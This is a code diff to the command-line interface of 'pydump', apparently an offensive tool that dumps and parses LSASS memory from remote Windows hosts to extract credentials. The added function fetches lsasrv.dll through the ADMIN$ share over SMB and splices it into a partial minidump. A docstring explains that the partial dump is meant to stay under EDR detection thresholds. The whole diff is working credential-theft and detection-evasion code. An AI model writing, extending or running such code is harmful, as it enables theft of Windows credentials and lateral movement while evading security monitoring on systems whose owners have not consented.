@@ -1,6 +1,7 @@
 """Command-line interface for pydump."""
 
 import argparse
+import struct
 import sys
 import os
 
@@ -99,7 +100,7 @@ def _cmd_dump(args):
 
             # LSASS
             if args.lsass and result.lsass_dump:
-                _show_lsass(result.lsass_dump)
+                _show_lsass(result.lsass_dump, session)
             elif args.lsass:
                 print("\n[-] No LSASS data received")
 
@@ -142,13 +143,49 @@ def _show_lsa_hive(result):
         print(f"  [!] {e}")
 
 
-def _show_lsass(dump_data: bytes):
+def _inject_disk_module(dump, session):
+    """Read lsasrv.dll from disk via SMB and inject as memory segment.
+
+    The agent's targeted dump only includes lsasrv's .data section to stay
+    under EDR thresholds. The extractor needs .text for pattern scanning.
+    On x64, .text is identical on disk and in memory (RIP-relative, no fixups).
+    """
+    from .parser.minidump import MemorySegment
+
+    lsasrv = dump.find_module("lsasrv")
+    if not lsasrv:
+        print("    [dbg] lsasrv module not found in dump")
+        return
+
+    try:
+        disk_data = session.read_file("ADMIN$", "System32\\lsasrv.dll")
+    except Exception as e:
+        print(f"    [dbg] failed to read lsasrv.dll from disk: {e}")
+        return
+    if not disk_data or len(disk_data) < 0x200 or disk_data[:2] != b"MZ":
+        print(f"    [dbg] invalid lsasrv.dll disk data: {len(disk_data) if disk_data else 0} bytes")
+        return
+    padded = disk_data
+    if len(padded) < lsasrv.size:
+        padded = padded + b"\x00" * (lsasrv.size - len(padded))
+
+    dump.memory.append(MemorySegment(
+        start=lsasrv.base_address,
+        size=lsasrv.size,
+        data=padded,
+    ))
+
+
+def _show_lsass(dump_data: bytes, session=None):
     from .parser.minidump import parse
     from .parser.extract import CredentialExtractor
 
     print("[*] Parsing minidump...")
     dump = parse(dump_data)
     print(f"    OS: {dump.sysinfo_major}.{dump.sysinfo_minor} build {dump.sysinfo_build}")
+
+    if session:
+        _inject_disk_module(dump, session)
 
     extractor = CredentialExtractor(dump)
     try:
